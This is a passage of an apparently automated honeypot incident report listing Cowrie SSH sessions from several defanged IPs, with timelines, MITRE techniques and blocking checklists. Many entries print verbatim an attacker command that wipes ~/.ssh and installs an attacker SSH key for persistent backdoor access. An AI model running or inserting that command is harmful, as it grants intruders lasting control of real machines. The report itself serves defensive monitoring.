| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:00:59` | `cowrie.session.connect` |
| `2026-04-16 05:00:59` | `cowrie.client.version` |
| `2026-04-16 05:01:00` | `cowrie.client.kex` |
| `2026-04-16 05:01:01` | `cowrie.login.success` |
| `2026-04-16 05:01:02` | `cowrie.session.params` |
| `2026-04-16 05:01:02` | `cowrie.command.input` |
| `2026-04-16 05:01:02` | `cowrie.command.failed` |
| `2026-04-16 05:01:02` | `cowrie.log.closed` |
| `2026-04-16 05:01:03` | `cowrie.session.params` |
| `2026-04-16 05:01:03` | `cowrie.command.input` |
| `2026-04-16 05:01:03` | `cowrie.session.file_download` |
| `2026-04-16 05:01:03` | `cowrie.log.closed` |
| `2026-04-16 05:01:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7355a7099191

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-16 05:01 |
| **Last Seen** | 2026-04-16 05:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:01:07` | `cowrie.session.connect` |
| `2026-04-16 05:01:07` | `cowrie.client.version` |
| `2026-04-16 05:01:07` | `cowrie.client.kex` |
| `2026-04-16 05:01:08` | `cowrie.login.success` |
| `2026-04-16 05:01:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3acb7f456b10

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-16 05:04 |
| **Last Seen** | 2026-04-16 05:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:04:14` | `cowrie.session.connect` |
| `2026-04-16 05:04:14` | `cowrie.client.version` |
| `2026-04-16 05:04:14` | `cowrie.client.kex` |
| `2026-04-16 05:04:15` | `cowrie.login.success` |
| `2026-04-16 05:04:16` | `cowrie.session.params` |
| `2026-04-16 05:04:16` | `cowrie.command.input` |
| `2026-04-16 05:04:16` | `cowrie.command.failed` |
| `2026-04-16 05:04:16` | `cowrie.log.closed` |
| `2026-04-16 05:04:17` | `cowrie.session.params` |
| `2026-04-16 05:04:17` | `cowrie.command.input` |
| `2026-04-16 05:04:17` | `cowrie.session.file_download` |
| `2026-04-16 05:04:17` | `cowrie.log.closed` |
| `2026-04-16 05:04:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ea2be0ab969

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-16 05:04 |
| **Last Seen** | 2026-04-16 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:04:21` | `cowrie.session.connect` |
| `2026-04-16 05:04:21` | `cowrie.client.version` |
| `2026-04-16 05:04:21` | `cowrie.client.kex` |
| `2026-04-16 05:04:22` | `cowrie.login.success` |
| `2026-04-16 05:04:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf0ccdd3060c

| Field | Detail |
|---|---|
| **Source IP** | `152.32.172[.]177` |
| **First Seen** | 2026-04-16 05:06 |
| **Last Seen** | 2026-04-16 05:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:06:13` | `cowrie.session.connect` |
| `2026-04-16 05:06:13` | `cowrie.client.version` |
| `2026-04-16 05:06:13` | `cowrie.client.kex` |
| `2026-04-16 05:06:14` | `cowrie.login.success` |
| `2026-04-16 05:06:14` | `cowrie.session.params` |
| `2026-04-16 05:06:14` | `cowrie.command.input` |
| `2026-04-16 05:06:14` | `cowrie.command.failed` |
| `2026-04-16 05:06:14` | `cowrie.log.closed` |
| `2026-04-16 05:06:14` | `cowrie.session.params` |
| `2026-04-16 05:06:14` | `cowrie.command.input` |
| `2026-04-16 05:06:14` | `cowrie.session.file_download` |
| `2026-04-16 05:06:14` | `cowrie.log.closed` |
| `2026-04-16 05:06:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.172[.]177` to AbuseIPDB if not already reported
- [ ] Block `152.32.172[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52c0e82e4326

| Field | Detail |
|---|---|
| **Source IP** | `152.32.172[.]177` |
| **First Seen** | 2026-04-16 05:06 |
| **Last Seen** | 2026-04-16 05:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:06:16` | `cowrie.session.connect` |
| `2026-04-16 05:06:16` | `cowrie.client.version` |
| `2026-04-16 05:06:16` | `cowrie.client.kex` |
| `2026-04-16 05:06:17` | `cowrie.login.success` |
| `2026-04-16 05:06:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.172[.]177` to AbuseIPDB if not already reported
- [ ] Block `152.32.172[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdf6836a1360

| Field | Detail |
|---|---|
| **Source IP** | `152.32.253[.]205` |
| **First Seen** | 2026-04-16 05:06 |
| **Last Seen** | 2026-04-16 05:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:06:37` | `cowrie.session.connect` |
| `2026-04-16 05:06:37` | `cowrie.client.version` |
| `2026-04-16 05:06:38` | `cowrie.client.kex` |
| `2026-04-16 05:06:38` | `cowrie.login.success` |
| `2026-04-16 05:06:38` | `cowrie.session.params` |
| `2026-04-16 05:06:38` | `cowrie.command.input` |
| `2026-04-16 05:06:38` | `cowrie.command.failed` |
| `2026-04-16 05:06:38` | `cowrie.log.closed` |
| `2026-04-16 05:06:39` | `cowrie.session.params` |
| `2026-04-16 05:06:39` | `cowrie.command.input` |
| `2026-04-16 05:06:39` | `cowrie.session.file_download` |
| `2026-04-16 05:06:39` | `cowrie.log.closed` |
| `2026-04-16 05:06:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.253[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.32.253[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fc5e33136a5

| Field | Detail |
|---|---|
| **Source IP** | `152.32.253[.]205` |
| **First Seen** | 2026-04-16 05:06 |
| **Last Seen** | 2026-04-16 05:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:06:41` | `cowrie.session.connect` |
| `2026-04-16 05:06:41` | `cowrie.client.version` |
| `2026-04-16 05:06:41` | `cowrie.client.kex` |
| `2026-04-16 05:06:41` | `cowrie.login.success` |
| `2026-04-16 05:06:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.253[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.32.253[.]205` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8aefe7e0862

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]47` |
| **First Seen** | 2026-04-16 05:08 |
| **Last Seen** | 2026-04-16 05:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:08:30` | `cowrie.session.connect` |
| `2026-04-16 05:08:30` | `cowrie.client.version` |
| `2026-04-16 05:08:30` | `cowrie.client.kex` |
| `2026-04-16 05:08:30` | `cowrie.login.success` |
| `2026-04-16 05:08:31` | `cowrie.session.params` |
| `2026-04-16 05:08:31` | `cowrie.command.input` |
| `2026-04-16 05:08:31` | `cowrie.command.failed` |
| `2026-04-16 05:08:31` | `cowrie.log.closed` |
| `2026-04-16 05:08:31` | `cowrie.session.params` |
| `2026-04-16 05:08:31` | `cowrie.command.input` |
| `2026-04-16 05:08:31` | `cowrie.session.file_download` |
| `2026-04-16 05:08:31` | `cowrie.log.closed` |
| `2026-04-16 05:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]47` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea420397ece8

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]47` |
| **First Seen** | 2026-04-16 05:08 |
| **Last Seen** | 2026-04-16 05:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:08:34` | `cowrie.session.connect` |
| `2026-04-16 05:08:34` | `cowrie.client.version` |
| `2026-04-16 05:08:34` | `cowrie.client.kex` |
| `2026-04-16 05:08:34` | `cowrie.login.success` |
| `2026-04-16 05:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]47` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97d08e8fc19f

| Field | Detail |
|---|---|
| **Source IP** | `83.49.101[.]27` |
| **First Seen** | 2026-04-16 05:12 |
| **Last Seen** | 2026-04-16 05:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:12:51` | `cowrie.session.connect` |
| `2026-04-16 05:12:51` | `cowrie.client.version` |
| `2026-04-16 05:12:51` | `cowrie.client.kex` |
| `2026-04-16 05:12:52` | `cowrie.login.success` |
| `2026-04-16 05:12:53` | `cowrie.session.params` |
| `2026-04-16 05:12:53` | `cowrie.command.input` |
| `2026-04-16 05:12:53` | `cowrie.command.failed` |
| `2026-04-16 05:12:53` | `cowrie.log.closed` |
| `2026-04-16 05:12:54` | `cowrie.session.params` |
| `2026-04-16 05:12:54` | `cowrie.command.input` |
| `2026-04-16 05:12:54` | `cowrie.session.file_download` |
| `2026-04-16 05:12:54` | `cowrie.log.closed` |
| `2026-04-16 05:12:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.49.101[.]27` to AbuseIPDB if not already reported
- [ ] Block `83.49.101[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecdd0bf85b76

| Field | Detail |
|---|---|
| **Source IP** | `83.49.101[.]27` |
| **First Seen** | 2026-04-16 05:12 |
| **Last Seen** | 2026-04-16 05:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:12:57` | `cowrie.session.connect` |
| `2026-04-16 05:12:57` | `cowrie.client.version` |
| `2026-04-16 05:12:58` | `cowrie.client.kex` |
| `2026-04-16 05:12:59` | `cowrie.login.success` |
| `2026-04-16 05:12:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.49.101[.]27` to AbuseIPDB if not already reported
- [ ] Block `83.49.101[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf1ec0645f10

| Field | Detail |
|---|---|
| **Source IP** | `83.49.101[.]27` |
| **First Seen** | 2026-04-16 05:14 |
| **Last Seen** | 2026-04-16 05:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:14:36` | `cowrie.session.connect` |
| `2026-04-16 05:14:36` | `cowrie.client.version` |
| `2026-04-16 05:14:37` | `cowrie.client.kex` |
| `2026-04-16 05:14:38` | `cowrie.login.success` |
| `2026-04-16 05:14:39` | `cowrie.session.params` |
| `2026-04-16 05:14:39` | `cowrie.command.input` |
| `2026-04-16 05:14:39` | `cowrie.command.failed` |
| `2026-04-16 05:14:39` | `cowrie.log.closed` |
| `2026-04-16 05:14:40` | `cowrie.session.params` |
| `2026-04-16 05:14:40` | `cowrie.command.input` |
| `2026-04-16 05:14:40` | `cowrie.session.file_download` |
| `2026-04-16 05:14:40` | `cowrie.log.closed` |
| `2026-04-16 05:14:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.49.101[.]27` to AbuseIPDB if not already reported
- [ ] Block `83.49.101[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19901c18f927

| Field | Detail |
|---|---|
| **Source IP** | `83.49.101[.]27` |
| **First Seen** | 2026-04-16 05:14 |
| **Last Seen** | 2026-04-16 05:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:14:43` | `cowrie.session.connect` |
| `2026-04-16 05:14:43` | `cowrie.client.version` |
| `2026-04-16 05:14:44` | `cowrie.client.kex` |
| `2026-04-16 05:14:45` | `cowrie.login.success` |
| `2026-04-16 05:14:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.49.101[.]27` to AbuseIPDB if not already reported
- [ ] Block `83.49.101[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71709ac5b449

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-16 05:17 |
| **Last Seen** | 2026-04-16 05:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:17:17` | `cowrie.session.connect` |
| `2026-04-16 05:17:17` | `cowrie.client.version` |
| `2026-04-16 05:17:17` | `cowrie.client.kex` |
| `2026-04-16 05:17:19` | `cowrie.login.success` |
| `2026-04-16 05:17:19` | `cowrie.session.params` |
| `2026-04-16 05:17:19` | `cowrie.command.input` |
| `2026-04-16 05:17:19` | `cowrie.command.failed` |
| `2026-04-16 05:17:20` | `cowrie.log.closed` |
| `2026-04-16 05:17:20` | `cowrie.session.params` |
| `2026-04-16 05:17:20` | `cowrie.command.input` |
| `2026-04-16 05:17:21` | `cowrie.session.file_download` |
| `2026-04-16 05:17:21` | `cowrie.log.closed` |
| `2026-04-16 05:17:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b66288dd203

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]69` |
| **First Seen** | 2026-04-16 05:17 |
| **Last Seen** | 2026-04-16 05:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:17:24` | `cowrie.session.connect` |
| `2026-04-16 05:17:24` | `cowrie.client.version` |
| `2026-04-16 05:17:24` | `cowrie.client.kex` |
| `2026-04-16 05:17:26` | `cowrie.login.success` |
| `2026-04-16 05:17:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]69` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a947e2bf9ef

| Field | Detail |
|---|---|
| **Source IP** | `83.49.101[.]27` |
| **First Seen** | 2026-04-16 05:21 |
| **Last Seen** | 2026-04-16 05:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:21:30` | `cowrie.session.connect` |
| `2026-04-16 05:21:30` | `cowrie.client.version` |
| `2026-04-16 05:21:30` | `cowrie.client.kex` |
| `2026-04-16 05:21:31` | `cowrie.login.success` |
| `2026-04-16 05:21:32` | `cowrie.session.params` |
| `2026-04-16 05:21:32` | `cowrie.command.input` |
| `2026-04-16 05:21:32` | `cowrie.command.failed` |
| `2026-04-16 05:21:32` | `cowrie.log.closed` |
| `2026-04-16 05:21:33` | `cowrie.session.params` |
| `2026-04-16 05:21:33` | `cowrie.command.input` |
| `2026-04-16 05:21:33` | `cowrie.session.file_download` |
| `2026-04-16 05:21:33` | `cowrie.log.closed` |
| `2026-04-16 05:21:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.49.101[.]27` to AbuseIPDB if not already reported
- [ ] Block `83.49.101[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28fc3975f88f

| Field | Detail |
|---|---|
| **Source IP** | `83.49.101[.]27` |
| **First Seen** | 2026-04-16 05:21 |
| **Last Seen** | 2026-04-16 05:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:21:37` | `cowrie.session.connect` |
